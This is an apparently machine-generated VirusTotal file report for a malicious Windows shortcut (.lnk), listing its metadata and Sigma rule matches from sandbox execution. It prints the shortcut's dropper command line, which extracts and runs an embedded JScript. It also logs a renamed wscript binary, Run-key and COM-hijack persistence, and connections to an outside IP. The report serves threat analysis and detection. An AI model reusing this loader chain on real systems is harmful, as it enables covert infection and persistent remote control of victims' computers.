{
    "data":  {
                 "id":  "c88467a4416518a52ce45a51f96c9c280e3ece539613e82b0d9fe6f2d4122a3a",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/c88467a4416518a52ce45a51f96c9c280e3ece539613e82b0d9fe6f2d4122a3a"
                           },
                 "attributes":  {
                                    "meaningful_name":  "c88467a4416518a52ce45a51f96c9c280e3ece539613e82b0d9fe6f2d4122a3a.lnk",
                                    "type_extension":  "lnk",
                                    "available_tools":  [
                                                            "sigcheck"
                                                        ],
                                    "first_submission_date":  1699837000,
                                    "last_modification_date":  1768219089,
                                    "lnk_info":  {
                                                     "volume_serial_number":  "748e-3e12",
                                                     "modification_date":  "2010-11-21T03:24:06.698856Z",
                                                     "link_flags":  [
                                                                        "HasTargetIDList",
                                                                        "HasLinkInfo",
                                                                        "HasRelativePath",
                                                                        "IsUnicode",
                                                                        "HasExprString",
                                                                        "HasArguments",
                                                                        "HasIconLocation"
                                                                    ],
                                                     "local_path":  "C:\\Windows\\System32\\cmd.exe",
                                                     "machine_id":  "win-5jkmu7vuhc3",
                                                     "command_line_arguments":  "/c DIR 000792244100393251090026219142\\00157269330078632939 \u0026 for /f \"delims=\" %a in (\u0027dir /S/b *.lnk  %temp%\\*.lnk\u0027) do (if %~za gtr 79002 (findstr /b \"var onm=\" \"%a\" \u003e %temp%\\~26210619.js \u0026 cscript %temp%\\~26210619.js 9))\u0026cls\u0026exit",
                                                     "icon_location":  ".\\78631859.pdf",
                                                     "creation_date":  "2010-11-21T03:24:06.698856Z",
                                                     "target_path":  "My Computer (Computer) : C:\\Windows\\System32\\cmd.exe",
                                                     "header":  {
                                                                    "show_window":  7,
                                                                    "file_size":  302592,
                                                                    "hot_key":  "(0+0)",
                                                                    "show_window_str":  "SW_SHOWMINNOACTIVE"
                                                                },
                                                     "relative_path":  "..\\..\\..\\Windows\\System32\\cmd.exe",
                                                     "mac_vendor_name":  "Microsoft Corporation",
                                                     "mac_address":  "00:15:5d:4d:c8:86",
                                                     "link_target_id_list":  [
                                                                                 {
                                                                                     "item_type":  31,
                                                                                     "item_type_str":  "CLSID_ShellDesktop",
                                                                                     "clsid":  "20d04fe0-3aea-1069-a2d8-08002b30309d"
                                                                                 }
                                                                             ],
                                                     "access_date":  "2010-11-21T03:24:06.698856Z",
                                                     "extra_data":  {
                                                                        "dlt_properties":  {
                                                                                               "birth_droid_file_id":  "d35b6bdd-4249-11ee-9916-00155d4dc886",
                                                                                               "droid_file_id":  "d35b6bdd-4249-11ee-9916-00155d4dc886",
                                                                                               "birth_droid_volume_id":  "ef2106a2-f4aa-4ceb-bafb-237ce9399f34",
                                                                                               "droid_volume_id":  "ef2106a2-f4aa-4ceb-bafb-237ce9399f34"
                                                                                           }
                                                                    }
                                                 },
                                    "ssdeep":  "6144:ydr8fmEOmqG2K13qPIWAiC/Q5FNTrmwMtGQqOh5PAW7LebJcDgym8/kU0:0QDOmqzHPZAilTiwMtfh5P1Lo4kB",
                                    "crowdsourced_ids_stats":  {
                                                                   "high":  0,
                                                                   "info":  0,
                                                                   "medium":  1,
                                                                   "low":  5
                                                               },
                                    "trid":  [
                                                 {
                                                     "file_type":  "Windows Shortcut",
                                                     "probability":  100.0
                                                 }
                                             ],
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7483-6551-3606-000000004800}; ProcessId=7792; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Console Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7482-6551-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654; OriginalFileName=cscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7696; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cscript  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\System32\\cscript.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c DIR 000792244100393251090026219142\\00157269330078632939 \u0026 for /f \"delims=\" %a in (\u0027dir /S/b *.lnk  C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk\u0027) do (if %~za gtr 79002 (findstr /b \"var onm=\" \"%a\" \u003e C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js \u0026 cscript C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9))\u0026cls\u0026exit; UtcTime=1699837059; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2020feadc9b3cf47558c219948361d9d3eb5347af91135f21bf711f6032bc817",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WScript or CScript Dropper",
                                                                       "rule_description":  "Detects wscript/cscript executions of scripts located in user directories",
                                                                       "rule_author":  "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-748C-6551-3E06-000000004800}; ProcessId=8176; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-748C-6551-3C06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=8072; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837068; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7495-6551-4C06-000000004800}; ProcessId=7736; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7495-6551-4A06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7812; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-23A8-030000000000; LogonId=239651; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837077; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-749D-6551-5006-000000004800}; ProcessId=5716; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-749D-6551-4E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7928; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-23A8-030000000000; LogonId=239651; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837085; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "25fc56c1bee673d7ff3edcf371e4d2a36c0af83222da348961b87735c8efa61f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "System File Execution Location Anomaly",
                                                                       "rule_description":  "Detects a Windows program executable started from a suspicious folder",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=7792; EventType=SetValue; Image=C:\\Windows\\system32\\cscript.exe; ProcessGuid={C784477D-7483-6551-3606-000000004800}; UtcTime=1699837067; Details=cmd /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CTFM0N.EXE}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; EventType=SetValue; Details=cmd /c start %TEMP%\\dllhost.exe %TEMP%\\~26210619.js; TargetObject=HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CTFM0N.EXE}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "27b72c2678411f21ba21bd10b44b7e9c45594d5a5f61f14223b81a8906675039",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "New RUN Key Pointing to Suspicious Folder",
                                                                       "rule_description":  "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-748C-6551-3E06-000000004800}; ProcessId=8176; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-748C-6551-3C06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=8072; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837068; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7495-6551-4C06-000000004800}; ProcessId=7736; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7495-6551-4A06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7812; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-23A8-030000000000; LogonId=239651; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837077; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-749D-6551-5006-000000004800}; ProcessId=5716; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-749D-6551-4E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7928; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-23A8-030000000000; LogonId=239651; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837085; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "6a0e84509806d4477d42410fb267c817a01015e3dcc33e48330f8db0ba9709da",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
                                                                       "rule_description":  "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.",
                                                                       "rule_author":  "Matthew Green - @mgreen27, Florian Roth (Nextron Systems), frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7483-6551-3606-000000004800}; ProcessId=7792; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Console Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7482-6551-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654; OriginalFileName=cscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7696; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cscript  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\System32\\cscript.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c DIR 000792244100393251090026219142\\00157269330078632939 \u0026 for /f \"delims=\" %a in (\u0027dir /S/b *.lnk  C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk\u0027) do (if %~za gtr 79002 (findstr /b \"var onm=\" \"%a\" \u003e C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js \u0026 cscript C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9))\u0026cls\u0026exit; UtcTime=1699837059; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-748C-6551-3E06-000000004800}; ProcessId=8176; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-748C-6551-3C06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=8072; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837068; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7495-6551-4C06-000000004800}; ProcessId=7736; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7495-6551-4A06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7812; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-23A8-030000000000; LogonId=239651; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837077; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-749D-6551-5006-000000004800}; ProcessId=5716; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-749D-6551-4E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=7075DD7B9BE8807FCA93ACD86F724884,SHA256=A2B6E0612776C2CCC3F2B2641FADEBC45E7FA7D5244A728B76910FA372DBEDEB,IMPHASH=2D3F04AFD6BAF08CF07EE55BCF1AA52D; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7928; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; EventID=1; LogonGuid=C784477D-33E2-6538-23A8-030000000000; LogonId=239651; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c start C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js; UtcTime=1699837085; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "92acfd50d9fe4d995d6998a5346e4e031ea037d422458bb4f74555a52ffc886c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Script Interpreter Execution From Suspicious Folder",
                                                                       "rule_description":  "Detects a suspicious script execution in temporary folders or folders accessible by environment variables",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7483-6551-3606-000000004800}; ProcessId=7792; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Console Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7482-6551-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654; OriginalFileName=cscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7696; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cscript  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\System32\\cscript.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c DIR 000792244100393251090026219142\\00157269330078632939 \u0026 for /f \"delims=\" %a in (\u0027dir /S/b *.lnk  C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk\u0027) do (if %~za gtr 79002 (findstr /b \"var onm=\" \"%a\" \u003e C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js \u0026 cscript C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9))\u0026cls\u0026exit; UtcTime=1699837059; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "96d2c399118cab5d249093badf4a85f0ef1889872b0191bdf131bcabc0994681",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Script Execution From Temp Folder",
                                                                       "rule_description":  "Detects a suspicious script executions from temporary folder",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=3444; EventType=SetValue; Image=C:\\Windows\\SysWOW64\\regsvr32.exe; RuleName=T1122; UtcTime=1699837077; Details=C:\\Users\\george\\AppData\\Local\\Temp\\libeay32.dll; ProcessGuid={C784477D-7495-6551-4906-000000004800}; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001_Classes\\WOW6432Node\\CLSID\\{89565275-A714-4a43-912E-978B935EDCCC}\\InProcServer32\\(Default)}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "c64a541b46d176ef960f347f5e86ee15927eb668f86a5f9f6260bbc94b1d2f3a",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Persistence Via COM Hijacking From Suspicious Locations",
                                                                       "rule_description":  "Detects potential COM object hijacking where the \"Server\" (In/Out) is pointing to a suspicious or unsuale location",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=8004; TargetFilename=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; ProcessGuid={C784477D-748C-6551-3A06-000000004800}; CreationUtcTime=1699837068; UtcTime=1699837068; RuleName=EXE; Image=C:\\Windows\\System32\\cmd.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=0; TargetFilename=%TEMP%\\dllhost.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e13498937de9343f50c1e8f315ce602aa238e37e21f3dbb15d3403c25afafe3e",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Files With System Process Name In Unsuspected Locations",
                                                                       "rule_description":  "Detects the creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64...etc).",
                                                                       "rule_author":  "Sander Wiebing, Tim Shelton, Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-748C-6551-3A06-000000004800}; ProcessId=8004; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7483-6551-3606-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7792; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c copy C:\\Windows\\SysWow64\\wscript.exe C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe /y; EventID=1; LogonGuid=C784477D-33E2-6538-D6A7-030000000000; LogonId=239574; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=cscript  C:\\Users\\george\\AppData\\Local\\Temp\\~26210619.js 9; UtcTime=1699837068; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "f3c07a8418c3bded0e6f5bc97177ca9d501ba33f7bc9936b907b11f939603b14",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "LOL-Binary Copied From System Directory",
                                                                       "rule_description":  "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\n",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5716; DestinationPortName=domain; Protocol=udp; Initiated=true; DestinationIp=808:808:34c5:100:d39:600:0:0; SourcePortName=-; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; ProcessGuid={C784477D-749D-6551-5006-000000004800}; DestinationHostname=-; UtcTime=1698182490; User=DESKTOP-B0T93D6\\george; DestinationPort=53; RuleName=Usermode; SourcePort=54510; SourceIsIpv6=true; SourceHostname=-; SourceIp=c0a8:20a:0:0:2801:3aa9:85d8:ffff; DestinationIsIpv6=true}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5716; DestinationPortName=https; Protocol=tcp; DestinationIp=103.108.67.191; Initiated=true; SourcePortName=-; Image=C:\\Users\\george\\AppData\\Local\\Temp\\dllhost.exe; ProcessGuid={C784477D-749D-6551-5006-000000004800}; DestinationHostname=-; UtcTime=1698182490; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=Usermode; SourcePort=49721; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.10; DestinationIsIpv6=false}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "0469df5507574c65082f62410c1cc9e493ba1daeff82396b38a60516c6f4187c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Dllhost Internet Connection",
                                                                       "rule_description":  "Detects Dllhost that communicates with public IP addresses",
                                                                       "rule_author":  "bartblaze"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
